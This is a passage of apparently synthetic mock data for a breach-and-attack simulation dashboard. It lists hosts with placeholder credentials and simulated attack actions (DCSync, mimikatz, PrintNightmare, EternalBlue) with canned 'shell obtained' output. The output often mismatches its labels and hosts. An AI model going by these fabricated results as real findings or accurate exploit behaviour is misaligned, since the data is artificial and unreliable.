    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep92', node_type:'ASSET', node_label:'APP-92', node_hostname:'APP-92',
      node_ip:'10.10.4.21', node_platform:'Windows Server 2019', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\APP-92-audit.log'],
      node_credentials_found:['CORP\\app92:P@ss92!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep93', node_type:'ASSET', node_label:'DB-93', node_hostname:'DB-93',
      node_ip:'10.10.4.22', node_platform:'Red Hat 8', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\DB-93-audit.log'],
      node_credentials_found:['CORP\\db93:P@ss93!'],
    node_agents:['openaev'],
    },
    { node_id:'s5100EP-ep94', node_type:'ASSET', node_label:'FILE-94', node_hostname:'FILE-94',
      node_ip:'10.10.4.23', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\FILE-94-audit.log'],
      node_credentials_found:['CORP\\file94:P@ss94!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep95', node_type:'ASSET', node_label:'MAIL-95', node_hostname:'MAIL-95',
      node_ip:'10.10.4.24', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\MAIL-95-audit.log'],
      node_credentials_found:['CORP\\mail95:P@ss95!'],
    node_agents:['sentinel_one'],
    },
    { node_id:'s5100EP-ep96', node_type:'ASSET', node_label:'JUMP-96', node_hostname:'JUMP-96',
      node_ip:'10.10.4.25', node_platform:'Ubuntu 20.04 LTS', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\JUMP-96-audit.log'],
      node_credentials_found:['CORP\\jump96:P@ss96!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep97', node_type:'ASSET', node_label:'PRINT-97', node_hostname:'PRINT-97',
      node_ip:'10.10.4.26', node_platform:'Windows 10', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\PRINT-97-audit.log'],
      node_credentials_found:['CORP\\print97:P@ss97!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-ep98', node_type:'ASSET', node_label:'DNS-98', node_hostname:'DNS-98',
      node_ip:'10.10.4.27', node_platform:'Windows 11', node_status:'detected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\DNS-98-audit.log'],
      node_credentials_found:['CORP\\dns98:P@ss98!'],
    node_agents:['openaev'],
    },
    { node_id:'s5100EP-ep99', node_type:'ASSET', node_label:'DC-99', node_hostname:'DC-99',
      node_ip:'10.10.4.28', node_platform:'Ubuntu 22.04 LTS', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_accessed_files:['C:\\Logs\\DC-99-audit.log'],
      node_credentials_found:['CORP\\dc99:P@ss99!'],
    node_agents:['palo_alto'],
    },
    { node_id:'s5100EP-ep100', node_type:'ASSET', node_label:'WS-100', node_hostname:'WS-100',
      node_ip:'10.10.4.29', node_platform:'Windows 11', node_status:'undetected',
      node_zone:'AD / DC Tier', node_subnet:'10.10.4.0/24',
      node_is_pivot:true,
      node_accessed_files:['C:\\Logs\\WS-100-audit.log'],
      node_credentials_found:['CORP\\ws100:P@ss100!'],
    node_agents:['sentinel_one', 'openaev'],
    },
    { node_id:'s5100EP-a01', node_type:'ACTION', node_label:'nmap — Host Discovery (100 targets)',
      node_status:'undetected', node_hostname:'WEB-01', node_ip:'172.16.0.10',
      node_payload_name:'nmap-discovery', node_user_privileges:'root',
      node_executed_at:'2026-05-20 08:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'Starting Nmap 100-host scan...\nHost 172.16.0.10 is up (0.003s latency).\n22/tcp open ssh\n445/tcp open microsoft-ds\n100 hosts scanned.',
    },
    { node_id:'s5100EP-a02', node_type:'ACTION', node_label:'SharpHound → APP-02',
      node_status:'prevented', node_hostname:'APP-02', node_ip:'172.16.0.11',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:05:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → APP-02 (172.16.0.11)\n[-] BLOCKED by endpoint protection\n[!] Prevented at APP-02',
      node_expectations:[{expectation_id:'s5100EP-e01',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a03', node_type:'ACTION', node_label:'DCSync-krbtgt → DB-03',
      node_status:'undetected', node_hostname:'DB-03', node_ip:'172.16.0.12',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:11:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → DB-03 (172.16.0.12)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db03:P@ss03!'],
      node_accessed_files:['C:\\Logs\\DB-03-audit.log'],
    },
    { node_id:'s5100EP-a04', node_type:'ACTION', node_label:'psexec-lateral → FILE-04',
      node_status:'undetected', node_hostname:'FILE-04', node_ip:'172.16.0.13',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:18:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2021-44228 (Log4Shell) [critical]
[*] Target: FILE-04 (172.16.0.13)
[+] Vulnerable log4j-2.14.1 detected
[+] JNDI injection via User-Agent header
[+] DNS callback confirmed RCE
[+] Shell obtained as root`,
      node_credentials_found:['CORP\\file04:P@ss04!'],
      node_accessed_files:['C:\\Logs\\FILE-04-audit.log'],
    },
    { node_id:'s5100EP-a05', node_type:'ACTION', node_label:'wdigest-dump → MAIL-05',
      node_status:'undetected', node_hostname:'MAIL-05', node_ip:'172.16.0.14',
      node_payload_name:'wdigest-dump', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 08:21:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → MAIL-05 (172.16.0.14)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail05:P@ss05!'],
      node_accessed_files:['C:\\Logs\\MAIL-05-audit.log'],
    },
    { node_id:'s5100EP-a06', node_type:'ACTION', node_label:'PrintNightmare-LPE → JUMP-06',
      node_status:'undetected', node_hostname:'JUMP-06', node_ip:'172.16.0.15',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:27:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PrintNightmare-LPE → JUMP-06 (172.16.0.15)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump06:P@ss06!'],
      node_accessed_files:['C:\\Logs\\JUMP-06-audit.log'],
    },
    { node_id:'s5100EP-a07', node_type:'ACTION', node_label:'reg-sam-dump → PRINT-07',
      node_status:'undetected', node_hostname:'PRINT-07', node_ip:'172.16.0.16',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:33:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] reg-sam-dump → PRINT-07 (172.16.0.16)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\print07:P@ss07!'],
      node_accessed_files:['C:\\Logs\\PRINT-07-audit.log'],
    },
    { node_id:'s5100EP-a08', node_type:'ACTION', node_label:'nmap-discovery → DNS-08',
      node_status:'detected', node_hostname:'DNS-08', node_ip:'172.16.0.17',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 08:35:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → DNS-08 (172.16.0.17)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dns08:P@ss08!'],
      node_accessed_files:['C:\\Logs\\DNS-08-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e07',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a09', node_type:'ACTION', node_label:'netexec-smb-spray → DC-09',
      node_status:'undetected', node_hostname:'DC-09', node_ip:'172.16.0.18',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 08:43:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] netexec-smb-spray → DC-09 (172.16.0.18)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc09:P@ss09!'],
      node_accessed_files:['C:\\Logs\\DC-09-audit.log'],
    },
    { node_id:'s5100EP-a10', node_type:'ACTION', node_label:'PrintNightmare-LPE → WS-10',
      node_status:'detected', node_hostname:'WS-10', node_ip:'172.16.0.19',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 08:47:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-41773 (Apache RCE) [critical]
[*] Target: WS-10 (172.16.0.19)
[+] Apache 2.4.49 detected
[+] Path traversal + RCE via mod_cgi
[+] Shell as www-data -> root escalation`,
      node_credentials_found:['CORP\\ws10:P@ss10!'],
      node_accessed_files:['C:\\Logs\\WS-10-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e09',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a11', node_type:'ACTION', node_label:'pass-the-hash → API-11',
      node_status:'undetected', node_hostname:'API-11', node_ip:'172.16.0.20',
      node_payload_name:'pass-the-hash', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 08:50:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] pass-the-hash → API-11 (172.16.0.20)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api11:P@ss11!'],
      node_accessed_files:['C:\\Logs\\API-11-audit.log'],
    },
    { node_id:'s5100EP-a12', node_type:'ACTION', node_label:'DCSync-krbtgt → BACKUP-12',
      node_status:'prevented', node_hostname:'BACKUP-12', node_ip:'172.16.0.21',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 08:58:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → BACKUP-12 (172.16.0.21)\n[-] BLOCKED by endpoint protection\n[!] Prevented at BACKUP-12',
      node_expectations:[{expectation_id:'s5100EP-e11',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a13', node_type:'ACTION', node_label:'reg-sam-dump → MONITOR-13',
      node_status:'detected', node_hostname:'MONITOR-13', node_ip:'172.16.0.22',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 09:03:00 UTC', node_agent:'openaev',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for MONITOR-13 (172.16.0.22)
Host is up (0.003s latency).
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\monitor13:P@ss13!'],
      node_accessed_files:['C:\\Logs\\MONITOR-13-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e12',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a14', node_type:'ACTION', node_label:'psexec-lateral → VPN-14',
      node_status:'undetected', node_hostname:'VPN-14', node_ip:'172.16.0.23',
      node_payload_name:'psexec-lateral', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:06:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] psexec-lateral → VPN-14 (172.16.0.23)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\vpn14:P@ss14!'],
      node_accessed_files:['C:\\Logs\\VPN-14-audit.log'],
    },
    { node_id:'s5100EP-a15', node_type:'ACTION', node_label:'nmap-discovery → SIEM-15',
      node_status:'prevented', node_hostname:'SIEM-15', node_ip:'172.16.0.24',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:11:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → SIEM-15 (172.16.0.24)\n[-] BLOCKED by endpoint protection\n[!] Prevented at SIEM-15',
      node_expectations:[{expectation_id:'s5100EP-e14',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a16', node_type:'ACTION', node_label:'psexec-lateral → WEB-16',
      node_status:'undetected', node_hostname:'WEB-16', node_ip:'172.16.0.25',
      node_payload_name:'psexec-lateral', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:18:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] psexec-lateral → WEB-16 (172.16.0.25)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\web16:P@ss16!'],
      node_accessed_files:['C:\\Logs\\WEB-16-audit.log'],
    },
    { node_id:'s5100EP-a17', node_type:'ACTION', node_label:'reg-sam-dump → APP-17',
      node_status:'undetected', node_hostname:'APP-17', node_ip:'172.16.0.26',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:22:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] reg-sam-dump → APP-17 (172.16.0.26)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app17:P@ss17!'],
      node_accessed_files:['C:\\Logs\\APP-17-audit.log'],
    },
    { node_id:'s5100EP-a18', node_type:'ACTION', node_label:'netexec-smb-spray → DB-18',
      node_status:'prevented', node_hostname:'DB-18', node_ip:'172.16.0.27',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 09:27:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:`[nuclei] CVE-2021-34527 (PrintNightmare) [critical]
[*] Target: DB-18 (172.16.0.27)
[+] Windows Print Spooler detected (spoolsv.exe)
[+] RCE via AddPrinterDriverEx() - arbitrary DLL load
[+] Privilege escalated to SYSTEM
[+] Host fully compromised`,
      node_expectations:[{expectation_id:'s5100EP-e17',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a19', node_type:'ACTION', node_label:'netexec-smb-spray → FILE-19',
      node_status:'undetected', node_hostname:'FILE-19', node_ip:'172.16.0.28',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 09:33:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → FILE-19 (172.16.0.28)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\file19:P@ss19!'],
      node_accessed_files:['C:\\Logs\\FILE-19-audit.log'],
    },
    { node_id:'s5100EP-a20', node_type:'ACTION', node_label:'PrintNightmare-LPE → MAIL-20',
      node_status:'undetected', node_hostname:'MAIL-20', node_ip:'172.16.0.29',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 09:38:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] PrintNightmare-LPE → MAIL-20 (172.16.0.29)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail20:P@ss20!'],
      node_accessed_files:['C:\\Logs\\MAIL-20-audit.log'],
    },
    { node_id:'s5100EP-a21', node_type:'ACTION', node_label:'PowerView-recon → JUMP-21',
      node_status:'undetected', node_hostname:'JUMP-21', node_ip:'10.10.1.70',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 09:43:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] PowerView-recon → JUMP-21 (10.10.1.70)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump21:P@ss21!'],
      node_accessed_files:['C:\\Logs\\JUMP-21-audit.log'],
    },
    { node_id:'s5100EP-a22', node_type:'ACTION', node_label:'CrackMapExec → PRINT-22',
      node_status:'detected', node_hostname:'PRINT-22', node_ip:'10.10.1.71',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 09:46:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2022-22965 (Spring4Shell) [critical]
[*] Target: PRINT-22 (10.10.1.71)
[+] Spring Framework 5.3.17 detected
[+] DataBinder classLoader hijacking
[+] JSP webshell uploaded
[+] RCE confirmed as tomcat -> root`,
      node_credentials_found:['CORP\\print22:P@ss22!'],
      node_accessed_files:['C:\\Logs\\PRINT-22-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e21',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a23', node_type:'ACTION', node_label:'mimikatz-sekurlsa → DNS-23',
      node_status:'prevented', node_hostname:'DNS-23', node_ip:'10.10.1.72',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 09:53:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → DNS-23 (10.10.1.72)\n[-] BLOCKED by endpoint protection\n[!] Prevented at DNS-23',
      node_expectations:[{expectation_id:'s5100EP-e22',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a24', node_type:'ACTION', node_label:'DCSync-krbtgt → DC-24',
      node_status:'undetected', node_hostname:'DC-24', node_ip:'10.10.1.73',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\dev.user',
      node_executed_at:'2026-05-20 09:57:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → DC-24 (10.10.1.73)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\dc24:P@ss24!'],
      node_accessed_files:['C:\\Logs\\DC-24-audit.log'],
    },
    { node_id:'s5100EP-a25', node_type:'ACTION', node_label:'mimikatz-sekurlsa → WS-25',
      node_status:'undetected', node_hostname:'WS-25', node_ip:'10.10.1.74',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:02:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] mimikatz-sekurlsa → WS-25 (10.10.1.74)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\ws25:P@ss25!'],
      node_accessed_files:['C:\\Logs\\WS-25-audit.log'],
    },
    { node_id:'s5100EP-a26', node_type:'ACTION', node_label:'mimikatz-sekurlsa → API-26',
      node_status:'undetected', node_hostname:'API-26', node_ip:'10.10.1.75',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:07:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] mimikatz-sekurlsa → API-26 (10.10.1.75)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\api26:P@ss26!'],
      node_accessed_files:['C:\\Logs\\API-26-audit.log'],
    },
    { node_id:'s5100EP-a27', node_type:'ACTION', node_label:'wdigest-dump → BACKUP-27',
      node_status:'detected', node_hostname:'BACKUP-27', node_ip:'10.10.1.76',
      node_payload_name:'wdigest-dump', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 10:13:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] wdigest-dump → BACKUP-27 (10.10.1.76)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\backup27:P@ss27!'],
      node_accessed_files:['C:\\Logs\\BACKUP-27-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e26',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a28', node_type:'ACTION', node_label:'DCSync-krbtgt → MONITOR-28',
      node_status:'undetected', node_hostname:'MONITOR-28', node_ip:'10.10.1.77',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 10:18:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → MONITOR-28 (10.10.1.77)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\monitor28:P@ss28!'],
      node_accessed_files:['C:\\Logs\\MONITOR-28-audit.log'],
    },
    { node_id:'s5100EP-a29', node_type:'ACTION', node_label:'PowerView-recon → VPN-29',
      node_status:'undetected', node_hostname:'VPN-29', node_ip:'10.10.1.78',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 10:20:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → VPN-29 (10.10.1.78)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\vpn29:P@ss29!'],
      node_accessed_files:['C:\\Logs\\VPN-29-audit.log'],
    },
    { node_id:'s5100EP-a30', node_type:'ACTION', node_label:'CrackMapExec → SIEM-30',
      node_status:'detected', node_hostname:'SIEM-30', node_ip:'10.10.1.79',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:28:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`[nuclei] CVE-2021-34473 (ProxyShell) [critical]
[*] Target: WS-30 (10.10.1.79)
[+] Microsoft Exchange 15.1.2375 detected
[+] Authentication bypass via /autodiscover
[+] RCE via EWS - shell obtained
[+] Host fully compromised`,
      node_credentials_found:['CORP\\siem30:P@ss30!'],
      node_accessed_files:['C:\\Logs\\SIEM-30-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e29',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a31', node_type:'ACTION', node_label:'CrackMapExec → WEB-31',
      node_status:'prevented', node_hostname:'WEB-31', node_ip:'10.10.1.80',
      node_payload_name:'CrackMapExec', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:31:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] CrackMapExec → WEB-31 (10.10.1.80)\n[-] BLOCKED by endpoint protection\n[!] Prevented at WEB-31',
      node_expectations:[{expectation_id:'s5100EP-e30',expectation_type:'PREVENTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a32', node_type:'ACTION', node_label:'mimikatz-sekurlsa → APP-32',
      node_status:'undetected', node_hostname:'APP-32', node_ip:'10.10.1.81',
      node_payload_name:'mimikatz-sekurlsa', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:36:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] mimikatz-sekurlsa → APP-32 (10.10.1.81)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\app32:P@ss32!'],
      node_accessed_files:['C:\\Logs\\APP-32-audit.log'],
    },
    { node_id:'s5100EP-a33', node_type:'ACTION', node_label:'DCSync-krbtgt → DB-33',
      node_status:'undetected', node_hostname:'DB-33', node_ip:'10.10.1.82',
      node_payload_name:'DCSync-krbtgt', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 10:42:00 UTC', node_agent:'sentinel_one',
      node_terminal_output:'[*] DCSync-krbtgt → DB-33 (10.10.1.82)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\db33:P@ss33!'],
      node_accessed_files:['C:\\Logs\\DB-33-audit.log'],
    },
    { node_id:'s5100EP-a34', node_type:'ACTION', node_label:'reg-sam-dump → FILE-34',
      node_status:'undetected', node_hostname:'FILE-34', node_ip:'10.10.1.83',
      node_payload_name:'reg-sam-dump', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 10:47:00 UTC', node_agent:'palo_alto',
      node_terminal_output:`Starting Nmap 7.94 ( https://nmap.org ) at 2026-05-20 08:00 UTC
Nmap scan report for FILE-34 (10.10.2.83)
Host is up (0.003s latency).
21/tcp   open  ftp
22/tcp   open  ssh
445/tcp  open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds`,
      node_credentials_found:['CORP\\file34:P@ss34!'],
      node_accessed_files:['C:\\Logs\\FILE-34-audit.log'],
    },
    { node_id:'s5100EP-a35', node_type:'ACTION', node_label:'SharpHound → MAIL-35',
      node_status:'undetected', node_hostname:'MAIL-35', node_ip:'10.10.1.84',
      node_payload_name:'SharpHound', node_user_privileges:'CORP\\net.monitor',
      node_executed_at:'2026-05-20 10:53:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] SharpHound → MAIL-35 (10.10.1.84)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\mail35:P@ss35!'],
      node_accessed_files:['C:\\Logs\\MAIL-35-audit.log'],
    },
    { node_id:'s5100EP-a36', node_type:'ACTION', node_label:'netexec-smb-spray → JUMP-36',
      node_status:'undetected', node_hostname:'JUMP-36', node_ip:'10.10.1.85',
      node_payload_name:'netexec-smb-spray', node_user_privileges:'CORP\\it.admin',
      node_executed_at:'2026-05-20 10:55:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] netexec-smb-spray → JUMP-36 (10.10.1.85)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\jump36:P@ss36!'],
      node_accessed_files:['C:\\Logs\\JUMP-36-audit.log'],
    },
    { node_id:'s5100EP-a37', node_type:'ACTION', node_label:'nmap-discovery → PRINT-37',
      node_status:'undetected', node_hostname:'PRINT-37', node_ip:'10.10.1.86',
      node_payload_name:'nmap-discovery', node_user_privileges:'CORP\\svc_tomcat',
      node_executed_at:'2026-05-20 11:00:00 UTC', node_agent:'openaev',
      node_terminal_output:'[*] nmap-discovery → PRINT-37 (10.10.1.86)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
      node_credentials_found:['CORP\\print37:P@ss37!'],
      node_accessed_files:['C:\\Logs\\PRINT-37-audit.log'],
    },
    { node_id:'s5100EP-a38', node_type:'ACTION', node_label:'PrintNightmare-LPE → DNS-38',
      node_status:'undetected', node_hostname:'DNS-38', node_ip:'10.10.1.87',
      node_payload_name:'PrintNightmare-LPE', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:08:00 UTC', node_agent:'openaev',
      node_terminal_output:`[nuclei] CVE-2017-0144 (EternalBlue/MS17-010) [critical]
[*] Target: BACKUP-38 (10.10.2.87)
[+] SMBv1 enabled on port 445
[+] EternalBlue exploit executed
[+] SYSTEM shell via DoublePulsar
[+] Mimikatz: credentials dumped`,
      node_credentials_found:['CORP\\dns38:P@ss38!'],
      node_accessed_files:['C:\\Logs\\DNS-38-audit.log'],
    },
    { node_id:'s5100EP-a39', node_type:'ACTION', node_label:'PowerView-recon → DC-39',
      node_status:'detected', node_hostname:'DC-39', node_ip:'10.10.1.88',
      node_payload_name:'PowerView-recon', node_user_privileges:'CORP\\domain_admin',
      node_executed_at:'2026-05-20 11:13:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] PowerView-recon → DC-39 (10.10.1.88)\n[+] Connected\n[!] ALERT — session terminated by SOC',
      node_credentials_found:['CORP\\dc39:P@ss39!'],
      node_accessed_files:['C:\\Logs\\DC-39-audit.log'],
      node_expectations:[{expectation_id:'s5100EP-e38',expectation_type:'DETECTION',expectation_status:'SUCCEEDED',expectation_score:100,expectation_expected_score:100}],
    },
    { node_id:'s5100EP-a40', node_type:'ACTION', node_label:'CrackMapExec → WS-40',
      node_status:'undetected', node_hostname:'WS-40', node_ip:'10.10.1.89',
      node_payload_name:'CrackMapExec', node_user_privileges:'NT AUTHORITY\\SYSTEM',
      node_executed_at:'2026-05-20 11:17:00 UTC', node_agent:'palo_alto',
      node_terminal_output:'[*] CrackMapExec → WS-40 (10.10.1.89)\n[+] Shell obtained\n[+] Privilege escalated\n[+] Host fully compromised',
